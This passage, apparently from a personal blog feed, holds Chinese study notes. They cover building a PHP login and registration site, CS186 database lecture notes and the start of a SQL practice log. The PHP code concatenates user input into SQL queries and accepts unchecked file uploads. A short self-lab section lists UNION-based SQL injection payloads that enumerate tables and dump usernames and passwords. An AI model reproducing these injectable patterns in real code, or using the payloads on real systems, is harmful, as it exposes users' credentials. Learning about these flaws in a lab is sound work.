&lt;br&gt;</span><br><span class="line">密码：</span><br><span class="line">&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password1&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">重新输入密码：</span><br><span class="line">&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password2&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">请输入手机号码：</span><br><span class="line">&lt;input type=<span class="string">&quot;passwrd&quot;</span> name=<span class="string">&quot;shouji&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">上传图像：</span><br><span class="line">&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;tupian&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$zhErr</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;img src=<span class="string">&quot;&lt;?php echo &quot;</span>tupian/<span class="string">&quot;.<span class="subst">$_FILES</span>[&quot;</span>tupian<span class="string">&quot;][&quot;</span>name<span class="string">&quot;];?&gt;&quot;</span> alt=<span class="string">&quot;上传的图片&quot;</span> /&gt;</span><br></pre></td></tr></table></figure>
<h4 id="查询数据"><a class="header-anchor" href="#查询数据">¶</a>查询数据</h4>
<ul>
<li>
<p>SELECT 语句用于从数据表中读取数据:</p>
<p><code>SELECT column_name(s) FROM table_name</code></p>
</li>
</ul>
<h4 id="PHP联动查询"><a class="header-anchor" href="#PHP联动查询">¶</a>PHP联动查询</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;conn.php&#x27;</span>);</span><br><span class="line"><span class="variable">$chaxun</span>=<span class="string">&quot;select * from kkk_tbl;&quot;</span>;</span><br><span class="line"><span class="variable">$lianjie</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn2</span>,<span class="variable">$chaxun</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// var_dump($lianjie);</span></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$lianjie</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span>=<span class="variable">$row</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">    <span class="variable">$pass</span>=<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line">    <span class="variable">$phone</span>=<span class="variable">$row</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;user:&quot;</span>.<span class="variable">$user</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="string">&quot;pass:&quot;</span>.<span class="variable">$pass</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="string">&quot;phone:&quot;</span>.<span class="variable">$phone</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>原始查询代码</li>
</ul>
<p><code>select id, username from users where id = 2;</code></p>
<ul>
<li>优化后的php代码</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;conn.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$chaxunsql</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;chaxun&#x27;</span>];</span><br><span class="line"><span class="comment">//增加一个判断，判断传入值是数字还是字符串</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$chaxunsql</span>))&#123;</span><br><span class="line">	<span class="variable">$chaxunsql</span>=<span class="string">&quot;id=<span class="subst">$chaxunsql</span>&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$chaxunsql</span>=<span class="string">&quot;username=&#x27;<span class="subst">$chaxunsql</span>&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$chaxun</span>=<span class="string">&quot;select id,username from users where <span class="subst">$chaxunsql</span> &quot;</span>;</span><br><span class="line"><span class="variable">$reslust</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$chaxun</span>);</span><br><span class="line"><span class="comment">//mysqli_fetch_assoc() 查询数据库结果并且赋值为一行</span></span><br><span class="line">@<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$reslust</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>];</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$row</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="comment">//提取row数字中的username字段</span></span><br><span class="line"><span class="variable">$html</span> = <span class="string">&quot;id:<span class="subst">$id</span>&lt;/br&gt;username:<span class="subst">$username</span>&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;mate charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;h1&gt;请输入你要查询的id或者账号名字&lt;/h1&gt;</span><br><span class="line">    </span><br><span class="line">&lt;form action=<span class="string">&quot;#&quot;</span> method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;chaxun&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> &gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$html</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="例：网站登录注册-登录界面Pro"><a class="header-anchor" href="#例：网站登录注册-登录界面Pro">¶</a>例：网站登录注册+登录界面Pro</h2>
<ul>
<li>注：注册界面任务分解，先写出最简单的登录页面，只需要能够判断是否登录成功即可</li>
<li>结构：
<ul>
<li>tupian(文件夹，存放静态资源)</li>
<li>login.php 登陆界面</li>
<li>zhuxiao.php  注销界面</li>
<li>conn.php   数据库连接界面</li>
<li>zhuce.php   注册界面</li>
<li>session.php   管理session</li>
<li>youxi.php    假装后台界面</li>
</ul>
</li>
</ul>
<h3 id="登录页面login-php"><a class="header-anchor" href="#登录页面login-php">¶</a>登录页面login.php</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;conn.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="variable">$uapsql</span>=<span class="string">&quot;select user,pass from kkk_tbl where user=&#x27;<span class="subst">$username</span>&#x27; and pass=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$reslust</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn2</span>,<span class="variable">$uapsql</span>);</span><br><span class="line"><span class="comment">// var_dump($reslust);</span></span><br><span class="line"><span class="comment">// var_dump();</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$reslust</span>))&#123;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:youxi.php&#x27;</span>);</span><br><span class="line">	<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]=<span class="string">&#x27;true&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$login</span> = <span class="string">&quot;登录失败&quot;</span>;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]=<span class="string">&#x27;false&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">    </span><br><span class="line">&lt;h1&gt;请输入账号以及密码&lt;/h1&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span> &gt;&lt;/br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt; &lt;/br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span>&gt; &lt;/br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">    </span><br><span class="line">&lt;a href=<span class="string">&quot;zhuce.php&quot;</span>&gt;点击注册&lt;/a&gt;&lt;/br&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$login</span>;<span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<h3 id="注销界面zhuxiao-php"><a class="header-anchor" href="#注销界面zhuxiao-php">¶</a>注销界面zhuxiao.php</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;login&quot;</span>]=<span class="string">&#x27;false&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:login.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="数据库连接界面conn-php"><a class="header-anchor" href="#数据库连接界面conn-php">¶</a>数据库连接界面conn.php</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;kkk&quot;</span>;</span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="variable">$conn2</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">// echo &quot;数据连接成功&lt;/br&gt;&quot;;</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>))&#123;</span><br><span class="line"><span class="comment">// // echo &quot;数据库已经存在&quot;;</span></span><br><span class="line"><span class="comment">// $conn2 = mysqli_connect($servername, $username, $password, $dbname);</span></span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;开始自动创建数据库&lt;/br&gt;&quot;</span>;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;create DATABASE &quot;</span>.<span class="variable">$dbname</span>;</span><br><span class="line">		<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;数据库创建成功&lt;/br&gt;&quot;</span>;</span><br><span class="line">		<span class="variable">$createtbl</span>=<span class="string">&quot;CREATE TABLE IF NOT EXISTS `kkk_tbl`(</span></span><br><span class="line"><span class="string">        `id` INT UNSIGNED AUTO_INCREMENT,</span></span><br><span class="line"><span class="string">        `user` VARCHAR(10) NOT NULL,</span></span><br><span class="line"><span class="string">        `pass` VARCHAR(10) NOT NULL,</span></span><br><span class="line"><span class="string">        `phone` VARCHAR(11) NOT NULL,</span></span><br><span class="line"><span class="string">        `file` VARCHAR(30) ,</span></span><br><span class="line"><span class="string">        PRIMARY KEY ( `id` )</span></span><br><span class="line"><span class="string">        )ENGINE=InnoDB DEFAULT CHARSET=utf8;&quot;</span>;</span><br><span class="line">		<span class="variable">$conn2</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line">		<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn2</span>, <span class="variable">$createtbl</span>);</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;数据表创建成功&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="注册界面zhuce-php"><a class="header-anchor" href="#注册界面zhuce-php">¶</a>注册界面zhuce.php</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;conn.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$password1</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password1&#x27;</span>];</span><br><span class="line"><span class="variable">$password2</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password2&#x27;</span>];</span><br><span class="line"><span class="variable">$shouji</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;shouji&#x27;</span>];</span><br><span class="line"><span class="variable">$tupian</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;tupian&#x27;</span>];</span><br><span class="line"><span class="variable">$tupianname</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;tupian&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="comment">// echo $name,$password1,$password2,$shouji,$tupian;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$name</span>) ||</span><br><span class="line">    <span class="keyword">empty</span>(<span class="variable">$password1</span>) ||</span><br><span class="line">    <span class="keyword">empty</span>(<span class="variable">$password2</span>) ||</span><br><span class="line">    <span class="keyword">empty</span>(<span class="variable">$shouji</span>))&#123;</span><br><span class="line">		<span class="variable">$ERR</span>=<span class="string">&quot;账号密码、手机号码不能为空&quot;</span>;</span><br><span class="line">        <span class="comment">//密码长度8位,密码两次输入一致</span></span><br><span class="line">        <span class="comment">//密码验证</span></span><br><span class="line">        <span class="comment">//手机11位</span></span><br><span class="line">        <span class="comment">//文件上传jpg</span></span><br><span class="line">	&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password1</span>)&lt;<span class="number">8</span>)&#123;</span><br><span class="line">		<span class="variable">$ERR</span>=<span class="string">&quot;密码长度不足八位&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">elseif</span>(<span class="variable">$password1</span>!=<span class="variable">$password2</span>)&#123;</span><br><span class="line">		<span class="variable">$ERR</span>=<span class="string">&quot;两次输入密码不一致&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$shouji</span>)!=<span class="string">&quot;11&quot;</span>)&#123;</span><br><span class="line">		<span class="variable">$ERR</span>=<span class="string">&quot;手机号码格式有问题&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">// echo $_FILES[&quot;tupian&quot;][&quot;name&quot;];</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;tupian/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;tupian&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;tupian&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; 文件已经存在。 &quot;</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">// 如果 upload 目录不存在该文件则将文件上传到 upload 目录下</span></span><br><span class="line">			<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;tupian&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;tupian/&quot;</span> .</span><br><span class="line">			<span class="variable">$_FILES</span>[<span class="string">&quot;tupian&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">			<span class="comment">// echo &quot;文件存储在: &quot; . &quot;tupian/&quot; . $_FILES[&quot;tupian&quot;][&quot;name&quot;];</span></span><br><span class="line">&#125;</span><br><span class="line">	<span class="variable">$sqlinsert</span>=<span class="string">&quot;insert into kkk_tbl(user,pass,phone,file)</span></span><br><span class="line"><span class="string">	value(&#x27;<span class="subst">$name</span>&#x27;,&#x27;<span class="subst">$password1</span>&#x27;,&#x27;<span class="subst">$shouji</span>&#x27;,&#x27;<span class="subst">$tupianname</span>&#x27;);&quot;</span>;</span><br><span class="line">	<span class="title function_ invoke__">var_dump</span>(<span class="variable">$conn2</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn2</span>, <span class="variable">$sqlinsert</span>))&#123;</span><br><span class="line">        <span class="variable">$ERR</span>=<span class="string">&quot;注册成功&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$ERR</span>=<span class="string">&quot;注册失败&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span>method=<span class="string">&quot;post&quot;</span>enctype=<span class="string">&quot;multipart/form-data&quot;</span> &gt;</span><br><span class="line">名字：</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span> &gt; &lt;br&gt;</span><br><span class="line">密码：</span><br><span class="line">&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password1&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">重新输入密码：</span><br><span class="line">&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password2&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">请输入手机号码：</span><br><span class="line">&lt;input type=<span class="string">&quot;passwrd&quot;</span> name=<span class="string">&quot;shouji&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">上传头像：</span><br><span class="line">&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;tupian&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ERR</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;你注册的用户为：&quot;</span>.<span class="variable">$name</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;你注册的手机号码：&quot;</span>.<span class="variable">$shouji</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">&lt;img src=<span class="string">&quot;&lt;?php echo &quot;</span>tupian/<span class="string">&quot;.<span class="subst">$_FILES</span>[&quot;</span>tupian<span class="string">&quot;][&quot;</span>name<span class="string">&quot;]; ?&gt;&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
<h3 id="管理session-session-php"><a class="header-anchor" href="#管理session-session-php">¶</a>管理session  session.php</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&quot;login&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&quot;login&quot;</span>] == <span class="literal">true</span>) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;您已经成功登陆&lt;a href=&#x27;zhuxiao.php&#x27;&gt;点击注销&lt;/a&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&quot;login&quot;</span>] == <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;您无权访问,&lt;a href=&#x27;login.php&#x27;&gt;点击跳转登录页面&lt;/a&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="假装后台界面-youxi-php"><a class="header-anchor" href="#假装后台界面-youxi-php">¶</a>假装后台界面  youxi.php</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;session.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;mate charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;h1&gt;游戏页面&lt;/h1&gt;</span><br><span class="line">        &lt;a href=<span class="string">&quot;select.php&quot;</span>&gt;点击账号以及ID的对应关系&lt;/a&gt;</span><br><span class="line">        &lt;a href=<span class="string">&quot;jsq.php&quot;</span>&gt;数字炸弹&lt;/a&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<h2 id="PHP登录实战"><a class="header-anchor" href="#PHP登录实战">¶</a>PHP登录实战</h2>
<ul>
<li>
<p><strong>实验七：综合作业（注册、登录、玩游戏）</strong></p>
</li>
<li>
<p>用户登录以后可以直接打开多个链接，比如之前写入的用户查询页面，计算页面，可以将我们之前写入的都写进来</p>
</li>
<li>
<p>思路：</p>
<ul>
<li>将session功能单独变成一个文件，在不同的页面里面引入即可</li>
</ul>
</li>
</ul>
<h2 id="select-php攻击实战（sql初次尝试）"><a class="header-anchor" href="#select-php攻击实战（sql初次尝试）">¶</a><strong>select.php</strong>攻击实战（sql初次尝试）</h2>
<p>轮子：admin’ and ‘1’='1</p>
<p>查询字段数量：<code>admin' order by 2--+'</code></p>
<p>查询回显位置：<code>admin' union select 1,2--+'</code></p>
<p>查询数据库库：<code>admin' union select database(),2--+'</code></p>
<p>查询数据表：</p>
<ul>
<li><code>select table_name from information_schema.tables where table_schema=&quot;kkk&quot;;</code></li>
</ul>
<p>变形：</p>
<ul>
<li><code>-admin' union select table_name,2 from information_schema.tables where table_schema='kkk</code></li>
</ul>
<p>继续查询字段：</p>
<ul>
<li><code>-admin' union select group_concat(column_name),2 from information_schema.columns where table_name='kkk_tbl</code></li>
</ul>
<p>查询数据内容：</p>
<p><code>-admin' union select group_concat(user,pass),2 from kkk_tbl where '1' ='1</code></p>
<h2 id="写在后面"><a class="header-anchor" href="#写在后面">¶</a>写在后面</h2>
<p>有点懵的一话。。。今天因为某些特殊原因有点心不在焉，所以任务的话回头再看看吧。php初级语法就学到这里，我看后面如果要深入学习php的话，<code>ThinkPHP</code>框架是绕不过去的。、</p>
<p>不过就目前看，php还没掌握完全，下一步也没确定。。。。先不急这个</p>
]]></content>
      <categories>
        <category>notes</category>
        <category>SQL notes</category>
        <category>PHP notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>Database</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>CS186 SQL4 Berkeley</title>
    <url>/project/2024/07/13/CS_Notes/Database/CS186-SQL4-Berkeley/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p>Berkeley CS186 Intro to DB Systems</p>
<p><a href="https://www.youtube.com/watch?v=Q-dxGaR3fH0&amp;list=PLYp4IGUhNFmw8USiYMJvCUjZe79fvyYge&amp;index=6">视频地址</a>  课程记录</p>
<h2 id="SQL-4"><a class="header-anchor" href="#SQL-4">¶</a>SQL 4</h2>
<h3 id="Overview-Files-of-Pages-of-Records"><a class="header-anchor" href="#Overview-Files-of-Pages-of-Records">¶</a>Overview: Files of Pages of Records</h3>
<ul>
<li><strong>Tables</strong> stored as logical files   在数据库中，表通常被视为逻辑上的文件，它们是数据的逻辑存储单元
<ul>
<li>Consist of <strong>pages</strong>    由页面组成
<ul>
<li>Pages contain a collection of <strong>records</strong>   页面包含一系列记录</li>
</ul>
</li>
</ul>
</li>
<li>Pages are managed    页面管理
<ul>
<li>On disk by the disk space manager: pages read / written to physical disk/files    磁盘空间管理器在磁盘上：页面被读取/写入到物理磁盘/文件</li>
<li>In memory by the buffer manager: higher levels of DBMS only operate in memory    缓冲区管理器在内存中：数据库管理系统的更高层次仅在内存中操作</li>
</ul>
</li>
</ul>
<h3 id="Database-Files-Files-of-Pages-of-Records"><a class="header-anchor" href="#Database-Files-Files-of-Pages-of-Records">¶</a>Database Files (Files of Pages of Records)</h3>
<ul>
<li>DB FILE: A collection of pages, each containing a collection of records</li>
<li>API for higher layers of the DBMS    为数据库管理系统的更高层提供API
<ul>
<li>Insert / delete / modify record   增删查改</li>
<li>Fetch a particular record by record id   通过记录ID获取特定记录
<ul>
<li>Record id is a pointer encoding pair of (pageID, location on page)    记录ID是一个指针，编码为（页面ID，页面上的位置）</li>
</ul>
</li>
<li>Scan all records    扫描所有记录
<ul>
<li>Possibly with some conditions on the records to be retrieved</li>
</ul>
</li>
</ul>
</li>
<li>Could span multiple OS files and even  machines   跨越多个操作系统文件甚至机器
<ul>
<li>Or “raw” disk devices    “原始”磁盘设备</li>
</ul>
</li>
</ul>
<h3 id="Many-DB-File-Structure"><a class="header-anchor" href="#Many-DB-File-Structure">¶</a>Many DB File Structure</h3>
<ul>
<li>
<p>Unordered Heap Files</p>
<ul>
<li>Records placed arbitrarily across pages</li>
</ul>
</li>
<li>
<p>Clustered Heap Files</p>
<ul>
<li>Records and pages are grouped</li>
</ul>
</li>
<li>
<p>Sorted Files</p>
<ul>
<li>Pages and records are in sorted order</li>
</ul>
</li>
<li>
<p>Index Files</p>
<ul>
<li>B+ Trees, Linear Hashing</li>
<li>May contain records or point to records in other files</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>notes</category>
        <category>SQL notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL practice record</title>
    <url>/project/2024/07/07/CS_Notes/Database/SQL-practice-record/</url>
    <content><![CDATA[<h4 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h4>
<p>昨天看完SQL部分，今天练习一下</p>
<p><a href="http://sqlmother.yupi.icu/#/learn">练习网站-SQL之母</a></p>
<h4 id="1-基础语法-查询-全表查询"><a class="header-anchor" href="#1-基础语法-查询-全表查询">¶</a>1 基础语法-查询-全表查询</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student</span><br></pre></td></tr></table></figure>
